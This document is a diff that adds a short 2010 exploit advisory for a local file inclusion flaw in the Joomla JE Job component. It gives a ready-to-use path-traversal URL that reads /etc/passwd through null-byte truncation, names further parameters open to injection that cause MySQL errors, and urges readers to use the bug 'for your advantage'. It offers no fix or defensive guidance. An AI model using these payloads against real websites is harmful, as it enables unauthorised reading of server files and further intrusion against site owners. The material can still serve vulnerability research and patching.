@@ -1,0 +1,50 @@
+# Exploit Title: Joomla Component JE Job Local File Inclusion Vulnerability
+# Date: 14.05.2010
+# Author: Valentin
+# Category: webapps/0day
+# Version: unknown/latest one
+# Tested on: 
+# CVE :  
+# Code : 
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x1 ::::::::::::::::::::::::::::::::::::::]
+>> General Information 
+Advisory/Exploit Title = Joomla Component JE Job Local File Inclusion Vulnerability
+Author = Valentin Hoebel
+Contact = valentin@xenuser.org
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x2 ::::::::::::::::::::::::::::::::::::::]
+>> Product information
+Name = JE Job Component
+Vendor = Harmis Technology
+Vendor Website = http://joomlaextensions.co.in/
+Affected Version(s) = unknown/latest one
+
+ 
+[:::::::::::::::::::::::::::::::::::::: 0x3 ::::::::::::::::::::::::::::::::::::::]
+>> #1 Vulnerability
+Type = Local File Inclusion
+Example URI = index.php?option=com_jejob&view=../../../../../../etc/passwd%00
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x4 ::::::::::::::::::::::::::::::::::::::]
+>> Additional Information
+Advisory/Exploit Published = 14.05.2010
+
+Triggering MySQL errors and injecting chars through the URL is possible.
+Play around a little bit, e.g.
+index.php?option=com_jejob&view=item_detail&itemid=XX&Itemid=[CODE]
+index.php?option=com_jejob&view=item&catid=[TRIGGER ERROR]
+and you will see that your input affects many parts of the component. Maybe you
+can use this bug for your advantage.
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x5 ::::::::::::::::::::::::::::::::::::::]
+>> Misc
+Greetz && Thanks = inj3ct0r team, Exploit DB, hack0wn and ExpBase!
+<3 packetstormsecurity.org!
+
+
+[:::::::::::::::::::::::::::::::::::::: EOF ::::::::::::::::::::::::::::::::::::::]
